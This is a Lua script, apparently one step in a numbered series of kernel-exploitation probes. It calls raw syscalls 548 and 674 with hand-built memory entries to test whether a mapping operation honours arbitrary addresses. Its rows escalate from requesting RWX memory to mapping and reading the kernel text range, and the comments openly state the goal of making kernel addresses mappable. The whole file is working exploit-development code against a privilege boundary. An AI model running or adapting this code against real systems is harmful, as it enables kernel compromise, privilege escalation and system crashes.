-- CRASH_CLASS: HIGH (the last row asks for a kernel address; it may panic)
-- PROBE 836a: sys 548 op 3 is a mapping op -- does it honour the entry address?
--
-- 835a: op 1 unmapped the region, op 3 returned a fresh address (0x310C08000).
-- The entry is {u64 addr, u64 ?, u64 len, u8 prot, u32 op} and case 0xabc0b0 is a
-- direct vm_map_protect with addr/len 0x4000-aligned.  If the mapping op treats
-- the entry's addr as a requested VA without a user-space bound, a kernel address
-- becomes mappable.  Rows are ordered least to most dangerous.

print("=== PROBE 836a: sys 548 op 3 address handling ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hx(v)
    if type(v) == "table" and v.h then
        return string.format("%08X%08X", to_num(v.h), to_num(v.l))
    end
    local n = to_num(v)
    if n < 0 then return string.format("-%X", -n) end
    return string.format("%X", n)
end

local sc548 = make_syscall(548)
local sc674 = make_syscall(674)
local entry = memory.alloc(0x40)
local buf = memory.alloc(0x9000)
local cnt = memory.alloc(8)

local function zero(p, n)
    for i = 0, n - 1, 8 do memory.write_qword(p + i, 0) end
end

local function prot_of(target)
    zero(buf, 0x9000)
    zero(cnt, 8)
    memory.write_dword(cnt, 512)
    local ok = pcall(function()
        return sc674(uint64(to_num(buf)), uint64(72), uint64(512), uint64(to_num(cnt)), uint64(0x40000000), uint64(0))
    end)
    if not ok then return -1 end
    local n = to_num(memory.read_dword(cnt))
    if n > 512 then n = 512 end
    for k = 0, n - 1 do
        local rec = buf + k * 72
        local slo = to_num(memory.read_dword(rec))
        local shi = to_num(memory.read_dword(rec + 4))
        local elo = to_num(memory.read_dword(rec + 8))
        local ehi = to_num(memory.read_dword(rec + 12))
        local f = slo + shi * 4294967296
        local e = elo + ehi * 4294967296
        if target >= f and target < e then
            return to_num(memory.read_dword(rec + 0x18))
        end
    end
    return -1
end

local function map_op(addr, len, prot, label)
    zero(entry, 0x40)
    memory.write_qword(entry, addr)
    memory.write_qword(entry + 8, 0)
    memory.write_qword(entry + 0x10, len)
    memory.write_byte(entry + 0x18, prot)
    memory.write_dword(entry + 0x1C, 3)
    print(string.format("[*] %s addr=%s len=%X prot=%X", label, hx(uint64(addr)), len, prot))
    local ok, ret = pcall(function()
        return sc548(uint64(0), uint64(0), uint64(to_num(entry)), uint64(1), uint64(0))
    end)
    if not ok then print("  PCALL-FAIL") return nil end
    print(string.format("  ret=%s", hx(ret)))
    return ret
end

-- A: kernel picks, R|X
local r = map_op(0, 0x4000, 5, "A")
if r and to_num(r) > 0 and to_num(r) < 0x800000000000 then
    local v = to_num(r)
    print(string.format("  A region prot=%X readable=%s", prot_of(v), tostring(pcall(function() return memory.read_dword(v) end))))
end

-- B: kernel picks, RWX requested
r = map_op(0, 0x4000, 7, "B")
if r and to_num(r) > 0 and to_num(r) < 0x800000000000 then
    local v = to_num(r)
    local p = prot_of(v)
    print(string.format("  B region prot=%X", p))
    if p >= 0 and p % 8 >= 4 then
        print("  B has W: writing")
        memory.write_dword(v, 0x41424344)
        print(string.format("  B wrote, read=%X", to_num(memory.read_dword(v))))
    end
end

-- C: a specific high user address
r = map_op(0x6000000000, 0x4000, 3, "C")
if r and to_num(r) > 0 then print(string.format("  C region prot=%X", prot_of(to_num(r)))) end

-- D: a user address we already use, different from the mapping
r = map_op(0x7000000000, 0x4000, 3, "D")
if r and to_num(r) > 0 then print(string.format("  D region prot=%X", prot_of(to_num(r)))) end

-- E: the kernel text range (last row; a panic here costs a relaunch)
r = map_op(0xFFFFFFFF8B000000, 0x4000, 3, "E")
if r and to_num(r) > 0 then
    print(string.format("  E region prot=%X", prot_of(to_num(r))))
    print(string.format("  E first dword=%X", to_num(memory.read_dword(0xFFFFFFFF8B000000))))
end

print("[Z] alive=true")
print("=== PROBE 836a COMPLETE ===")
